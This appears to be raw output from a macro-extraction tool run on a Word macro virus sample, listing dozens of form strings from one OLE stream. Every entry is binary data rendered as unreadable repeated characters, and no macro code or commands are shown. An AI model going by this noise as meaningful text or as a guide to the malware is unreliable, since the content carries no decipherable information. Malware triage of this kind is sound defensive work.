VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������֭��k��k��k��k��k��k��k��k��k��k��k��k��k��s��s��s��s��s{kJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R)�Z1{R){R){R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1֜R������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�c)�����R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J��Z��Z��Z��Z��Z��c��Z��c��c��c��c��c��c��c��c��c��c��c��c��c��c�{�{��ckR9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9��c֥k֭k֭k֭k֭k֭k֭k֭k֭k֥k֥kΥkΥkΥkΥkΥkΥkƜkƜcƜc�{R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k����������������������������������������������޵�޵�޵�޵�޵���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�Υ�޵�޵�޵�޵�޵�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������Ƶ���������������������������{�����������{��{��{��{��{������{kJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!����Μ�֭�Μν���{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{���999
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������k��k��k��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s�sZ)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R)�Z1�Z1{R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1֜R������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c)��R��s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�9����c)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)��Z��Z��Z��Z��Z��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��cƜc֭s֭s��c�kBcR1J9!91
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!RB)kZ9�{J��cΥkΥkΥk֥k֥k֥k֭k֥k֭k֥k֥kΥkΥkΥkΥkΥkΥkΥkƜkƜkƜcƜcB1!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k�������������������������������������������������������޵�޵���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�֭�ֽ�ֽ�ֽ�ֽ�ֽ�޵�޵�޵�޵�֭�֭�֭�֭�֭�֭�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s��������{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��c91!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!�{Z��{��s��s��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Μ�����������ޭ�s��s��s��s��s��s��s��s��s��s��s��s��{��{��{��{��{��{��{��{��s��c{kJ�sZ{kJ{kJ{kJ{kJ{kJ{kJ{kJkcB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R)�Z1{R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1ޜR������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{J!��s�����s{J!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!��R���9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��Z��Z��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��cƜkƜk��c��Z��Z��Z��c��cƜkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥk֥kΥkΥkΥkΥkΥkΥkΥkΥkƜkƜkƜkƜk�{R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�޵�޵�޵�ֽ�޵�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����ﵥ{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��cRB)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!JB1ZZ9kcBkcBkcB�{Z��s��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{cZB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kcB��������������s��{��s��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{�����������������������������k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1ޜR������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B��s��c��B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!��c��s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kZ9��Z��Z��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��cƜkƜkƜkƜkƜkƜkƜkƜkƜkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkƜkƜkƜkƜkƜk91!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Μ����֭��{��{��{��{��{��{��{��{��{��s��s��{��s��s��s��{��{��s��s��s��s��s��s��k�{Z{kJscJscJ{kJ�{Z��c��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��{��s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��������������������������������������������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1{R){R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1ޜR������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!�R!��R��Z��Bބ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!��s��R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��cƜcƜkƜkƜkƜkƜkƜkƜkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkΥkƜkƜkƜkƜkƜk�{R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s{kJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������{��{��{��{��{��{��{��{��{��{��{������������������������������������Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ���{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1{R){R){R)�Z1�Z1{R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1ޜR������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R!��9��9�9�k)9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�k)���cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��k��k��k��kƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkΥkΥkΥkΥkΥkΥkΥsΥsΥkΥkΥsΥkΥkΥkΥkΥkΥkΥkƜkƜkƜkƜk91!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƽ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1����Ƅ��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��Z!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RJB��������������{��{��{��{��{��{���������������������������������������Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ν�ν�ν�ν���{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)�Z1�Z1{R)�Z1{R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1ޜR������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!�R!�k)�c)�R!{J!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!��Z��R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{cB��c��c��c��c��c��c��c��k��c��c��k��k��k��k��k��k��k��k��k��kƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsƜkΥsƜkƜk�sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c���ƭ{��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��kB1!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ν�ν�ν�ν�ν�ν�ν�ν�ν����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)�Z1{R){R)�Z1�Z1{R){R){R)�Z1�Z1{R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1ޜR����������ޔ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�k)��s!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{R��k��k��k��k��k��k��k��k��k��k��k��k��k��k��kƜkƜkƜkƜkƜkƜkƜkΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥs�{R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�ε�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Μ��޵�c��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��ZcZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kcB�����������޽�����������������������������������Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ν�ν�ν�ν�ν�ν��Ɯ�Ɯ�Ɯ�Ɯ�Ɯ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)�Z1�Z1�Z1�Z1ޜR����������ބ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!��c�c)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
